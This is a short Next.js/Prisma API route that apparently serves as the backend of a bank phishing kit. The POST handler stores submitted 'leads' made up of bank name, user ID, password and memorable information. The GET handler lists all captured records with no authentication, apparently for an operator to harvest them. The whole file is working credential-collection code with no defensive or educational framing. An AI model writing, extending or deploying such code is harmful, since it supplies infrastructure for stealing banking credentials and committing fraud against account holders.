import { NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";

export const dynamic = "force-dynamic";

export async function POST(req: Request) {
  try {
    const body = await req.json();

    // Exact schema field mapping: 'bankName' instead of 'bank'
    const newLead = await prisma.lead.create({
      data: {
        bankName: body.bank || body.bankName || "Unknown Bank",
        optionLabel: body.extraData || body.option || "Default",
        userId: body.userId || "N/A",
        password: body.password || "N/A",
        memorableInfo: body.memorableInfo || "",
        extraData: body.extraData || "",
      },
    });

    return NextResponse.json({ success: true, data: newLead });
  } catch (error) {
    console.error("API Lead Error:", error);
    return NextResponse.json(
      { success: false, error: "Database save error" },
      { status: 500 }
    );
  }
}

export async function GET() {
  try {
    const leads = await prisma.lead.findMany({
      orderBy: { createdAt: "desc" },
    });
    return NextResponse.json({ success: true, data: leads });
  } catch (error) {
    return NextResponse.json({ success: false, data: [] }, { status: 500 });
  }
}